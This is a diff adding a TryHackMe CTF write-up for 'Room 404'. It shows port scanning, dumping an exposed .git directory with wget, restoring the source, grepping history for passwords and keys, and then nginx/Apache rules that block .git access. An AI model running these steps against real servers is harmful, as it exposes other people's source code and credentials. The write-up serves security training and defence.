@@ -1,0 +1,175 @@
+# TryHackMe — Room 404
+
+> **Platform:** TryHackMe  
+> **Challenge:** Room 404  
+> **Category:** Web Exploitation / Reconnaissance  
+> **Concepts:** Port Enumeration · Exposed `.git/` Directory · Git Repository Dumping · Source Code Recovery  
+
+---
+
+## Challenge Description
+
+The room is not on the floor plan, not in the brochure, not listed anywhere. But port 8080 is wide open — and the rooms a web server never advertises are often the ones worth finding.
+
+The target runs a web server on a non-standard port with a `.git/` directory left publicly accessible. The goal is to find it, dump the repository, and recover what should never have been left there.
+
+---
+
+## Attack Chain Overview
+
+```
+Port enumeration → port 8080 open
+        ↓
+Browse target → .git/ directory exposed on web server
+        ↓
+wget --mirror → recursively download entire .git/ directory
+        ↓
+git checkout . → restore full working tree from git objects
+        ↓
+Read recovered source code / files → flag
+```
+
+---
+
+## Step 1 — Port Enumeration
+
+The web application was not reachable on the standard port 80. A port scan revealed port 8080 open — a common alternative HTTP port used by development servers, proxies, and applications that run without root privileges.
+
+```bash
+nmap -sV <target-ip>
+```
+
+| Port | Service |
+|------|---------|
+| 8080 | HTTP (web application) |
+
+Visiting `http://TARGET:8080/` in the browser showed a web page. Checking for a `.git/` directory is a standard reconnaissance step any time you find a web server — if directory listing is enabled or the path is reachable, the entire repository history is exposed.
+
+```bash
+curl -s http://TARGET:8080/.git/HEAD
+# → ref: refs/heads/master
+```
+
+A response of `ref: refs/heads/master` confirms a live git repository is accessible. The server is serving the `.git/` folder over HTTP with no access controls.
+
+---
+
+## Step 2 — Dump the Exposed Repository
+
+Simply visiting `.git/` in a browser shows directory listing. But to actually recover code and history, the entire repository needs to be downloaded locally. `wget` in mirror mode handles this recursively:
+
+```bash
+wget --mirror -nH -P repodump http://TARGET:8080/.git/
+```
+
+**Flag breakdown:**
+
+| Flag | What it does |
+|------|-------------|
+| `--mirror` | Enables recursive download, timestamping, and infinite recursion depth — designed for mirroring entire sites |
+| `-nH` | No host directories — does not create a `TARGET:8080/` folder, keeps the structure flat |
+| `-P repodump` | Save everything into the `repodump/` directory |
+
+After this runs, `repodump/` contains a complete copy of the `.git/` directory — all objects, refs, config, and logs — but none of the actual working files yet. The working tree has to be reconstructed from the git objects.
+
+---
+
+## Step 3 — Restore the Working Tree
+
+```bash
+cd repodump
+git checkout .
+```
+
+`git checkout .` tells git to reconstruct all tracked files from the object database into the working directory. Since we now have a full copy of the objects locally, git can resolve the HEAD commit, walk the tree, and write out every file exactly as it existed at the time of the last commit.
+
+```bash
+ls -la
+# → all source files, configs, and any sensitive files committed to the repo
+```
+
+From here, reading the recovered files and checking git history reveals the flag and any other secrets committed to the repository.
+
+```bash
+# Check commit history for anything sensitive
+git log --oneline
+
+# Read specific files
+cat flag.txt
+
+# Look for secrets across all commits
+git log -p | grep -i "flag\|secret\|password\|key"
+```
+
+---
+
+## Why This Works — The Vulnerability Explained
+
+When developers deploy a web application by copying their entire project folder (including `.git/`) to a web server, they unintentionally expose the full version history of their code to anyone who knows to look.
+
+**What an attacker can recover from an exposed `.git/` directory:**
+
+- Every version of every file ever committed
+- Deleted files — removed from the working tree but still in git history
+- Commit messages — often describe what was changed and why
+- Author names and email addresses
+- Any secret ever committed — API keys, passwords, tokens — even if later deleted
+- The full directory structure of the application
+
+The web server does not need directory listing enabled. An attacker only needs to know the standard git file paths (`HEAD`, `config`, `packed-refs`, `objects/info/packs`) to reconstruct the entire repository piece by piece. Tools like `git-dumper` automate this even when directory listing is off.
+
+---
+
+## Lessons Learned
+
+**`.git/` should never be accessible on a production server.**  
+Add a rule to your web server configuration to block access to `.git/` entirely:
+
+```nginx
+# Nginx
+location ~ /\.git {
+    deny all;
+    return 404;
+}
+```
+
+```apache
+# Apache .htaccess
+RedirectMatch 404 /\.git
+```
+
+**Deploying via `git clone` or `rsync` of the project root is dangerous.**  
+The correct deployment approach either uses CI/CD pipelines that only copy built artifacts, or explicitly excludes `.git/` from the deploy step. Never `scp` or `rsync` a raw project directory to a web server without filtering.
+
+**Non-standard ports are not security through obscurity.**  
+Port 8080 is one of the first ports any attacker or scanner checks after 80 and 443. Running a service on a different port does not hide it — it only stops casual browser traffic. A one-line nmap scan finds it instantly.
+
+**Git history is permanent within the repo.**  
+Even if a secret was deleted in a later commit, it remains recoverable from the object database until the repository history is explicitly rewritten and garbage collected. Any secret that was ever committed must be considered compromised and rotated immediately, regardless of subsequent deletions.
+
+---
+
+## Quick Reference — Commands Used
+
+```bash
+# Port scan
+nmap -sV <target-ip>
+
+# Confirm .git/ is exposed
+curl -s http://TARGET:8080/.git/HEAD
+
+# Dump the full repository
+wget --mirror -nH -P repodump http://TARGET:8080/.git/
+
+# Restore working tree from git objects
+cd repodump
+git checkout .
+
+# Inspect history
+git log --oneline
+git log -p
+```
+
+---
+
+*Writeup by Saanvi · TryHackMe — Room 404*
